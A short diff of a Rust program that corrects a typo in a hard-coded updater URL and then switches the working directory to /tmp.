@@ -31,7 +31,7 @@ async fn main() -> Result<()> {
         println!("[*] Debug mode: {}", "ON".green().bold());
     }
 
-    let target: &str = "http://www.rhk.com:8000/updaterr";
+    let target: &str = "http://www.rhk.com:8000/updater";
 
     let temp_path = Path::new("/tmp");
     let change_current_dir = set_current_dir(temp_path);
